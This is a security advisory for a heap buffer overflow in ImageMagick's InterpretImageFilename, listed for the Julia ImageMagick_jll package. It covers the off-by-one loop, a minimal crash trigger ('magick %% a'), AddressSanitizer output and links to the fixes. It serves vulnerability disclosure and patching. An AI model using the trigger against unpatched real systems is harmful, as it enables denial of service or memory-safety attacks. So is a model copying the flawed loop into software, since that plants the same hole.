# [C] ImageMagick has a Heap Buffer Overflow in InterpretImageFilename

## Summary
Severity: Critical
Advisory: JLSEC-2026-916
Ecosystem: Julia
CVSS: 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
Published: 2026-07-30
Source: https://osv.dev/vulnerability/JLSEC-2026-916
Type: osv

## Affected
- Julia: `ImageMagick_jll` — affected >=0 <7.1.2001+0

## Details
# Heap Buffer Overflow in InterpretImageFilename

## Summary

A heap buffer overflow was identified in the `InterpretImageFilename` function of ImageMagick. The issue stems from an off-by-one error that causes out-of-bounds memory access when processing format strings containing consecutive percent signs (`%%`).

## Environment

  - **OS**: Arch Linux (Linux gmkhost 6.14.2-arch1-1 # 1 SMP PREEMPT_DYNAMIC Thu, 10 Apr 2025 18:43:59 +0000 x86_64 GNU/Linux (GNU libc) 2.41)
  - **Architecture**: x86_64
  - **Compiler**: gcc (GCC) 15.1.1 20250425

## Reproduction

### Build Instructions

```bash
# Clone the repository
git clone https://github.com/ImageMagick/ImageMagick.git
cd ImageMagick
git reset --hard 8fff9b4f44d2e8b5cae2bd6db70930a144d15f12

# Build with AddressSanitizer
export CFLAGS="-fsanitize=address -g -O1"
export CXXFLAGS="-fsanitize=address -g -O1"
export LDFLAGS="-fsanitizer=address"
./configure
make

# Set library path and trigger the crash
export LD_LIBRARY_PATH="$(pwd)/MagickWand/.libs:$(pwd)/MagickCore/.libs:$LD_LIBRARY_PATH"
./utilities/.libs/magick %% a
```

### Minimum Trigger

```bash
./utilities/.libs/magick %% [any_output_filename]
```

## Crash Analysis

### AddressSanitizer Output

```
$ ./utilities/.libs/magick %% a
=================================================================
==2227694==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7037f99e3ad3 at pc 0x741801e81a17 bp 0x7ffd22fa4e00 sp 0x7ffd22fa45b8
READ of size 1 at 0x7037f99e3ad3 thread T0
    #0 0x741801e81a16 in strchr /usr/src/debug/gcc/gcc/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:746
    #1 0x7418013b4f06 in InterpretImageFilename MagickCore/image.c:1674
    #2 0x7418012826a3 in ReadImages MagickCore/constitute.c:1040
    #3 0x741800e4696b in CLINoImageOperator MagickWand/operation.c:4959
    #4 0x741800e64de7 in CLIOption MagickWand/operation.c:5473
    #5 0x741800d92edf in ProcessCommandOptions MagickWand/magick-cli.c:653
    #6 0x741800d94816 in MagickImageCommand MagickWand/magick-cli.c:1392
    #7 0x741800d913e4 in MagickCommandGenesis MagickWand/magick-cli.c:177
    #8 0x5ef7a3546638 in MagickMain utilities/magick.c:162
    #9 0x5ef7a3546872 in main utilities/magick.c:193
    #10 0x7417ff53f6b4  (/usr/lib/libc.so.6+0x276b4) (BuildId: 468e3585c794491a48ea75fceb9e4d6b1464fc35)
    #11 0x7417ff53f768 in __libc_start_main (/usr/lib/libc.so.6+0x27768) (BuildId: 468e3585c794491a48ea75fceb9e4d6b1464fc35)
    #12 0x5ef7a3546204 in _start (/home/kforfk/workspace/fuzz_analysis/saigen/ImageMagick/utilities/.libs/magick+0x2204) (BuildId: 96677b60628cf297eaedb3eb17b87000d29403f2)

0x7037f99e3ad3 is located 0 bytes after 3-byte region [0x7037f99e3ad0,0x7037f99e3ad3)
allocated by thread T0 here:
    #0 0x741801f20e15 in malloc /usr/src/debug/gcc/gcc/libsanitizer/asan/asan_malloc_linux.cpp:67
    #1 0x7418013e86bc in AcquireMagickMemory MagickCore/memory.c:559

SUMMARY: AddressSanitizer: heap-buffer-overflow MagickCore/image.c:1674 in InterpretImageFilename
Shadow bytes around the buggy address:
  0x7037f99e3800: fa fa 07 fa fa fa 00 fa fa fa fd fa fa fa fd fa
  0x7037f99e3880: fa fa 07 fa fa fa 00 fa fa fa fd fa fa fa fd fa
  0x7037f99e3900: fa fa 07 fa fa fa 00 fa fa fa fd fa fa fa fd fa
  0x7037f99e3980: fa fa 07 fa fa fa 00 fa fa fa fd fa fa fa fd fa
  0x7037f99e3a00: fa fa 07 fa fa fa fd fa fa fa fd fa fa fa 00 04
=>0x7037f99e3a80: fa fa 00 04 fa fa 00 00 fa fa[03]fa fa fa 03 fa
  0x7037f99e3b00: fa fa 00 01 fa fa fa fa fa fa fa fa fa fa fa fa
  0x7037f99e3b80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7037f99e3c00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7037f99e3c80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7037f99e3d00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==2227694==ABORTING
```

## Root Cause Analysis

The first command line argument is interpreted as `MagickImageCommand`:
https://github.com/ImageMagick/ImageMagick/blob/8fff9b4f44d2e8b5cae2bd6db70930a144d15f12/utilities/magick.c#L83

```c
const CommandInfo
  MagickCommands[] =
  {
    MagickCommandSize("magick", MagickFalse, MagickImageCommand),
```

It is invoked here:
https://github.com/ImageMagick/ImageMagick/blob/8fff9b4f44d2e8b5cae2bd6db70930a144d15f12/MagickWand/magick-cli.c#L220

```c
status=command(image_info,argc,argv,&text,exception);
```

The execution then follows this path:

  - https://github.com/ImageMagick/ImageMagick/blob/8fff9b4f44d2e8b5cae2bd6db70930a144d15f12/MagickWand/magick-cli.c#L1387
  - https://github.com/ImageMagick/ImageMagick/blob/8fff9b4f44d2e8b5cae2bd6db70930a144d15f12/MagickWand/magick-cli.c#L586
  - https://github.com/ImageMagick/ImageMagick/blob/8fff9b4f44d2e8b5cae2bd6db70930a144d15f12/MagickWand/magick-cli.c#L419
  - https://github.com/ImageMagick/ImageMagick/blob/8fff9b4f44d2e8b5cae2bd6db70930a144d15f12/MagickWand/operation.c#L5391
  - https://github.com/ImageMagick/ImageMagick/blob/8fff9b4f44d2e8b5cae2bd6db70930a144d15f12/MagickWand/operation.c#L5473
  - https://github.com/ImageMagick/ImageMagick/blob/8fff9b4f44d2e8b5cae2bd6db70930a144d15f12/MagickWand/operation.c#L4959
  - https://github.com/ImageMagick/ImageMagick/blob/8fff9b4f44d2e8b5cae2bd6db70930a144d15f12/MagickCore/constitute.c#L1009
  - https://github.com/ImageMagick/ImageMagick/blob/8fff9b4f44d2e8b5cae2bd6db70930a144d15f12/MagickCore/constitute.c#L1039
  - https://github.com/ImageMagick/ImageMagick/blob/8fff9b4f44d2e8b5cae2bd6db70930a144d15f12/MagickCore/image.c#L1649
  - https://github.com/ImageMagick/ImageMagick/blob/8fff9b4f44d2e8b5cae2bd6db70930a144d15f12/MagickCore/image.c#L1674

The execution eventually reaches `InterpretImageFilename` and enters a loop. The `format` variable here is `"%%"`. At this point, it is safe to access `*(format + 2)` but not safe to access `*(format + 3)`.

```c
for (p=strchr(format,'%'); p != (char *) NULL; p=strchr(p+1,'%'))
{
  q=(char *) p+1;
  if (*q == '%')
    {
      p=q+1;
      continue;
    }
```

The first `strchr` call returns a pointer equal to `format` and assigns it to `p`. Then `q` is initialized with `p + 1` (`format + 1`), and `*q` is `'%'`, so the code enters the if branch. Here, `p` is reassigned to `q + 1` (`format + 2`).

In the next iteration, `p + 1` (`format + 3`) is passed to `strchr`, and when `strchr` accesses it, this causes an out-of-bounds read.

## References
- https://github.com/ImageMagick/ImageMagick/commit/29d82726c7ec20c07c49ba263bdcea16c2618e03
- https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-hm4x-r5hc-794f
- https://github.com/ImageMagick/ImageMagick6/commit/79b6ed03770781d996d1710b89fbb887e5ea758a
- https://github.com/advisories/GHSA-hm4x-r5hc-794f
- https://github.com/dlemstra/Magick.NET/releases/tag/14.7.0
- https://lists.debian.org/debian-lts-announce/2025/09/msg00012.html
- https://nvd.nist.gov/vuln/detail/CVE-2025-53014
